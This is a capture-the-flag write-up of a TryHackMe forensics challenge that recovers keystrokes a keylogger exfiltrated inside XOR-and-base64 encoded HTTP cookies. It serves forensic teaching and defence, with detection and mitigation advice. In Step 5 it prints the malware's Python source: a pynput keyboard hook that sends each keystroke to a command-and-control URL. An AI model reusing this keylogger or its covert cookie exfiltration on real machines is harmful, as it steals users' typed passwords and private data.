## CTF Writeup — "Packed Light" Keylogger Exfil (TryHackMe)
### TryHackMe · Hacker Holidays · Forensics / PCAP · Easy (60 pts) · reassembling keystrokes hidden in HTTP cookies

**Flag:** `THM{REDACTED}`

---

## TL;DR

A keylogger on a guest laptop sends **one keystroke per HTTP request** to a C2
server on port 8080. Each keystroke is XOR-encrypted, base64-encoded, and hidden
in a fake `Cookie` header. The packet capture also contains the malware's own
source code, which spells out the encryption. Reassemble the cookies in order,
reverse the encoding, and the keystrokes spell the flag.

---

## The attack chain

```
traffic.pcapng
        │
        ▼
Protocol stats  →  62 plain HTTP frames worth reading (rest is encrypted TLS)
        │
        ▼
Conversations  →  a beacon: identical requests to one host:8080, ~1/sec
        │
        ▼
Read the requests  →  fake User-Agent "ByteLotusClient"; data hides in the Cookie
        │
        ▼
One request grabbed /temp/updates.py  →  the malware's OWN source
        │
        ▼
Source reveals: keylogger, each key = XOR(key[0]) + base64 in cookie
        │
        ▼
Extract all cookies → base64-decode → XOR with 'H' → keystrokes  →  FLAG
```

---

## Background: beacons, exfiltration, and covert channels

A few terms this relies on:

- **PCAP** — a saved recording of network traffic (every packet, frozen for later
  inspection). `.pcapng` is the modern format.
- **tshark** — the command-line version of Wireshark. `-r file` reads a saved
  capture; `-Y 'filter'` shows only matching packets; `-T fields -e name` prints
  chosen fields.
- **Beacon / C2** — malware "phones home" to a **C**ommand-and-**C**ontrol server at
  regular intervals. Regular, identical little requests = a beacon.
- **Exfiltration** — stealing data out of a network. Here, keystrokes.
- **Covert channel** — hiding stolen data inside traffic that looks normal (here, a
  session cookie), so it blends in.

The whole idea: ordinary-looking web requests are secretly carrying stolen
keystrokes, one at a time.

## Step 1 — Get the shape of the capture

```bash
capinfos traffic.pcapng
tshark -r traffic.pcapng -q -z io,phs
```

- `capinfos` summarises the file (1348 packets, ~41 seconds — small and focused).
- `-z io,phs` prints the **protocol hierarchy** — which protocols make up the
  traffic. Most is encrypted TLS/QUIC (unreadable, ignore), but there are **62
  plain HTTP frames.** Unencrypted HTTP is where readable data lives, so that's the
  thread.

## Step 2 — Find the repetitive conversation

```bash
tshark -r traffic.pcapng -q -z conv,tcp
```

- `-z conv,tcp` groups packets into conversations. Dozens of near-identical
  connections from one internal IP to `34.41.103.191:8080`, ~1/second, with lots of
  data *up* and little *down*. That pattern — many short, evenly-spaced,
  upload-heavy connections to one host — is the beacon.

## Step 3 — Read the beacon's requests

```bash
tshark -r traffic.pcapng -Y 'http.request && tcp.port==8080' \
  -T fields -e http.host -e http.request.uri -e http.user_agent
```

Output shows:

```
byte-lotus-hotel.thm:8080   /temp/updates.py   Chrome/...        ← one-off: fetches the malware
byte-lotus-hotel.thm:8080   /                  ByteLotusClient/1.1 ← the beacons (all identical)
...
```

Two findings: the beacons all GET `/` with a fake User-Agent `ByteLotusClient/1.1`
(the "not a real app" tell), so the payload is in some *other* header — and one odd
request grabbed `/temp/updates.py`, almost certainly the malware itself.

## Step 4 — Find the hidden carrier field

Dump every header of one beacon:

```bash
tshark -r traffic.pcapng -Y 'frame.number==391' -O http
```

- `-O http` prints the **full** HTTP layer (every header) for one packet. The key
  line:

```
Cookie: hotel_sess_state=HA==
```

A session cookie whose value (`HA==`, base64 with `==` padding) decodes to a
**single byte**. So each beacon smuggles **one byte** inside a fake cookie — one
keystroke per request.

## Step 5 — Read the malware's source (the shortcut)

The capture contains `/temp/updates.py`. Reassemble that TCP stream as text:

```bash
tshark -r traffic.pcapng -z follow,tcp,ascii,5 -q
```

- `-z follow,tcp,ascii,5` rebuilds TCP stream #5 and prints it as text (like
  Wireshark's "Follow TCP Stream"). The server returned the `.py` file in plaintext,
  handing us the whole scheme:

```python
from pynput import keyboard              # ← a KEYLOGGER

def getkey():
    return "H0t3lSt@ff0Nly" + "K3epS3cr3t!"

def xor(data, key):                       # XOR each byte with the key
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    encrypted = xor(character.encode(), getkey().encode())   # (1) XOR the keystroke
    b64 = base64.b64encode(encrypted).decode()               # (2) base64 it
    requests.get(C2_URL, headers={"Cookie": f"hotel_sess_state={b64}"})  # (3) beacon out

def on_press(key):                        # fires on every keypress
    sendltr(key.char)
```

In plain terms: it's a **keylogger**. For every key you type it XOR-encrypts the
character, base64-encodes it, stuffs it in the `hotel_sess_state` cookie, and sends
one GET. One key = one request = the beacon.

## Step 6 — Reverse it (the subtle bit)

XOR is symmetric — the same key decrypts. But here's the catch: `sendltr` is called
**once per keystroke** with a **single character**. Look at `xor`: it indexes the
key by position *within the data*. Since the data is only **one byte**, that index
is always `0` — so **every keystroke is XOR'd with `key[0]` only**, which is `H`
(0x48). The rest of the key is never used.

So the decode XORs *every* byte with `0x48`:

```bash
tshark -r traffic.pcapng \
  -Y 'http.request && tcp.port==8080 && http.cookie contains "hotel_sess_state"' \
  -T fields -e http.cookie \
| sed 's/hotel_sess_state=//' \
| python3 -c '
import sys, base64
K = ord("H")                       # key[0] = 0x48; every keystroke resets here
out = bytearray()
for line in (l.strip() for l in sys.stdin if l.strip()):
    out += bytes(b ^ K for b in base64.b64decode(line))
print(out.decode("utf-8","replace"))
'
```

- The tshark line extracts the cookie from every beacon, in order.
- `sed` strips the `hotel_sess_state=` prefix, leaving the base64 value.
- The Python decodes each value and XORs each byte with `H`, then joins them.

> A first attempt used a *rolling* key (`key[i % len]`) across the stream and got
> `T0qr...` — the first char was right but the rest drifted. That's the tell that
> the key was mis-applied: because each keystroke resets to `key[0]`, the correct
> key is a single constant byte, not a rolling one.

Output:

```
THM{REDACTED}
```

---

## Root cause / what happened

1. A keylogger captured every keystroke on a guest laptop via `pynput`.
2. It exfiltrated covertly — one character per request, hidden in a normal-looking
   session cookie, over plain HTTP on a non-standard port.
3. The "encryption" (single-byte XOR + base64) is trivial obfuscation, not real
   crypto.
4. The operator left the malware's own source retrievable at `/temp/updates.py`,
   handing over the entire scheme.

## Defensive takeaways

- **Endpoint:** EDR / application allow-listing to stop `pynput`-style global
  keyboard hooks.
- **Network:** egress filtering — guest devices shouldn't reach arbitrary external
  hosts on :8080 over cleartext; force web traffic through an inspecting proxy.
- **Covert channel:** proxy-level anomaly detection on cookie entropy and
  per-request churn — a "session" cookie that changes every request is not how real
  sessions behave.

## Detection opportunities

This traffic is loud once you know the shape:

- **Regular beaconing** — near-identical requests at a fixed ~1 s interval; low
  variance in inter-packet timing is the classic beacon signature (RITA-style).
- **Suspicious User-Agent** — `ByteLotusClient/1.1` matches no real browser;
  UA allow/deny-listing catches it.
- **Cookie churn/entropy** — a session cookie whose high-entropy value changes every
  single request.
- **Direction ratio** — lots of bytes up, almost nothing down: an upload disguised
  as GETs.
- A Suricata/Zeek rule on the literal UA catches the known sample; a rule on
  "rapidly-mutating cookie with no server `Set-Cookie`" catches the *technique*.

## Command cheat-sheet

```
capinfos file.pcapng                                  # summary
tshark -r file -q -z io,phs                           # protocols present
tshark -r file -q -z conv,tcp                         # find the beacon conversation
tshark -r file -Y 'http.request' -T fields -e http.host -e http.request.uri -e http.user_agent
tshark -r file -Y 'frame.number==N' -O http           # all headers of one packet
tshark -r file -z follow,tcp,ascii,N -q               # read a whole TCP stream (malware source)
```

## Two things worth remembering

1. **When malware is in the capture, read *it*, not just the traffic.** The dropped
   `updates.py` handed over the exact cookie name, encoding, and XOR key — no
   guessing.
2. **Match the decode to how the data was encoded.** One-byte inputs reset the XOR
   key to position 0, so the whole stream decodes with a single constant byte — a
   rolling key silently corrupts everything after the first character.

*Analysed offline from the provided pcap — no live traffic. The capture, hosts, and
malware are fictional challenge material.*
